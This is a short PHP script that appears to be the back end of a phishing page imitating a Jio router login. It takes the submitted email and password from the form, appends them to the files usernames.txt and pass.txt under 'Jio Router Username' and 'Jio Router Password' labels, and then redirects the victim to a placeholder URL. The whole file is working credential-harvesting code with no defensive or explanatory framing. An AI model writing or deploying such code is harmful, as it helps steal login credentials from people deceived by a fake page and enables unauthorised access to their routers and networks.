<?php

file_put_contents("usernames.txt", "Jio Router Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Jio Router Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://redirecturl');
?>
